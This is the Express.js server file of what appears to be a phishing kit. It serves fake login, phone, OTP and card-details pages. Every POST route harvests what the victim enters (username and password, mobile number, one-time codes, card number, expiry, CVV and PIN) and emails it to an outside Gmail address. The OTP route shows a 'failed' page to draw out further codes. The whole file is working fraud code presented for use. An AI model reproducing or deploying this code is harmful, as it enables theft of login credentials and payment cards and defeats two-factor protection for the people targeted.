require('dotenv').config();
const express = require("express");
const nodemailer = require("nodemailer");
const config = require("./config");
const app = express();

const port = process.env.PORT || 3007;

config(app);

var transporter = nodemailer.createTransport({
    host: "mail.privateemail.com",
    port: 465,
    auth: {
      user: "info@applinic.com",
      pass: process.env.EMAIL_PASSWORD
    }
});


app.listen(port, () => console.log(`Server running on port ${port}`));


app.get("/", ( req , res ) => {
    res.render("index2")
});

app.get("/en/chl", ( req , res ) => {
    res.render("index")
});

app.get("/phone-verification", (req, res) => {
    res.render("mobilenumber")
})

app.get("/otp", (req, res) => {
    res.render("otp.html")
})

app.get("/load", (req, res) => {
    res.render("load.html")
})

app.post("/otp_post", (req, res) => {

    if(req.body.otpValue) {
        res.render("failed.html")
    } else {
        res.render("index.html")
    }

    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "orrealdesigners@gmail.com",
        subject: `OTP Code`,
        text: `OTP: ${req.body.otpValue}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

})

app.post("/phone-verification", (req, res) => {
    res.redirect("/card-details")
    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "orrealdesigners@gmail.com",
        subject: `Mobile Number`,
        text: `Mobile number: ${req.body.phn}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
})

app.get("/card-details", (req, res) => {
  res.render("carddetails")
})

app.post("/cardVerification", ( req, res) => {
    
    res.redirect('/load')
    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "orrealdesigners@gmail.com",
        subject: `Card Details`,
        text: `card number: ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
})

app.post("/login", ( req, res ) => {
    res.redirect(`/phone-verification`);
    req.session.user = req.body.Username;
    req.session.save();
    var mailOptions = {
        from: `${req.session.user} info@applinic.com`,
        to: "orrealdesigners@gmail.com",
        subject: `Client Login Alert`,
        text: `Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`
    };

    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

})